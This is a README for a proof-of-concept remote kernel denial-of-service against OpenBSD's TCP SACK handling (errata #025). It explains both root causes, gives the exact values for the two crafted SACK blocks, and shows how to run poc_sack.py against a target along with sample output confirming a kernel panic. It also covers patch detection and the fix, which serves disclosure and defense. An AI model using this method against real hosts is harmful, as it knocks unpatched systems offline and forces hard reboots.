# OpenBSD TCP SACK Remote Kernel DoS

Remote kernel panic in OpenBSD's TCP SACK implementation. A missing
lower-bound validation on `sack.start` in `tcp_sack_option()` combined
with a missing NULL pointer guard in the SACK hole append path allows an
unauthenticated remote attacker to crash the kernel via two crafted SACK
blocks in a single TCP packet.

**Errata:** OpenBSD 7.8 #025 / 7.7 #031 (March 25, 2026)
**Severity:** Remote DoS — kernel panic, requires hard reboot
**Auth:** None — any TCP connection to any listening service
**Fix:** [commit 0e8206e596ad](https://github.com/openbsd/src/commit/0e8206e596add74fef1653b4472de6b3723c435f)

## How It Works

OpenBSD's TCP stack uses signed 32-bit comparisons (`SEQ_LT`, `SEQ_LEQ`)
to order TCP sequence numbers. The SACK option handler `tcp_sack_option()`
in `sys/netinet/tcp_input.c` walks a singly-linked list of "SACK holes"
(gaps in acknowledged data). Two bugs combine:

1. **Missing lower-bound check.** `sack.start` is never validated against
   `snd_una`. An attacker can send `sack.start = snd_una + 2^31`, which
   due to signed overflow appears both "before the hole" and "after the
   last SACK" simultaneously.

2. **Missing NULL guard.** After deleting all holes from the linked list,
   the pointer `p` becomes NULL. The append path dereferences `p->next`
   without checking, causing a kernel page fault.

The exploit sends one TCP packet containing two SACK blocks:

- **Block 1** (normal): creates a SACK hole and sets `rcv_lastsack`.
- **Block 2** (overflow): `start = snd_una + 2^31 + 400`, `end = snd_una + 399`.
  The signed overflow causes the hole walk to delete the hole (`p = NULL`)
  and then triggers the append path (`p->next = temp` → NULL dereference → panic).

The fix adds `SEQ_LT(sack.start, snd_una) → reject` and a `p != NULL`
guard before the append.

The vulnerable code dates to approximately 1999

## Patch Detection

On the target:

```
syspatch -l | grep 025_sack
```

Or check the kernel build date — the fix was committed March 20, 2026.

## Usage

```
python3 poc_sack.py <target_ip> [port]
```

### Requirements

- **Root** on the attack host (raw sockets)
- **Linux attack host** (IP_HDRINCL behavior assumed)
- **Direct L2/L3 path** to target (not through NAT or TCP proxy)
- Target must have **TCP SACK enabled** (default on OpenBSD)
- Target must have at least one **listening TCP service**

The script automatically manages the required RST suppression rule
(via iptables or nft) and removes it on exit.

### Example

```
$ sudo python3 poc_sack.py 10.99.0.2 22
[*] OpenBSD SACK Remote Kernel DoS (Errata #025)
[*] Target:  10.99.0.2:22
[*] Source:  10.99.0.1:48123

[1] Establishing TCP connection...
    [+] Connected (server ISN=3812401648).
[2] Accumulating unacknowledged server data...
    [+] Banner: b'SSH-2.0-OpenSSH_10.2\r\n'
    [+] Unacked: 1040 bytes (snd_una=3812401671, snd_max=3812402711).
[3] Sending crash packet...
    [+] Sent.
        Block 1: [3812402017, 3812402217]
        Block 2: [0x633ca397, 3812402070]
[4] Verifying...
    [!] Target unresponsive — kernel panic.

[*] Kernel panic confirmed. Target requires hard reboot.
[*] Fix: syspatch (installs errata #025)
```

### Kernel Panic Output (on target console)

```
uvm_fault(0xffffffff82a54680, 0x10, 0, 2) -> e
kernel: page fault trap, code=2
Stopped at      tcp_sack_option+0x158:  movq    %rcx,0x10(%r13)
```

## References

- [OpenBSD 7.8 Errata #025](https://www.openbsd.org/errata78.html)
- [Fix commit 0e8206e596ad](https://github.com/openbsd/src/commit/0e8206e596add74fef1653b4472de6b3723c435f)
- [Mythos transcript](https://github.com/stanislavfort/mythos-jagged-frontier/blob/main/transcripts/openbsd-sack.md)
